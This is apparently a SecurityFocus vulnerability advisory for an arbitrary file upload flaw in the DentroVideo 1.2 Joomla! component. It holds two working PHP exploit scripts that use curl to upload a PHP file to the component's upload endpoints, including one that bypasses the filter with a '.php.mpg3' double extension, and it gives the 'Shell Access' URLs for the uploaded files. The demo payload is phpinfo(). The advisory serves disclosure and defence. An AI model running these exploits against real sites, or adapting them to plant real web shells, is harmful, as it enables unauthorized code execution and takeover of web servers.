source: http://www.securityfocus.com/bid/53972/info

The DentroVideo component for Joomla! is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

DentroVideo 1.2 is vulnerable; other versions may also be affected.

Exploit 1 :

PostShell.php

<?php

$uploadfile="lo.php";

$ch = 
curl_init("http://www.example.com/components/com_dv/externals/phpupload/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('file1'=>"@$uploadfile",
                'action'=>'upload'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";

?>

Shell Access : http://www.example.com/lo.php

lo.php
<?php
phpinfo();
?>


Exploit 2 :

PostShell2.php

<?php

$uploadfile="lo.php.mpg3";

$ch = 
curl_init("http://www.example.com/components/com_dv/externals/swfupload/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
                array('Filedata'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";

?>

Shell Access : http://www.example.com/dvvideos/uploads/originals/lo.php.mpg3

lo.php.mpg3
<?php
phpinfo();
?>
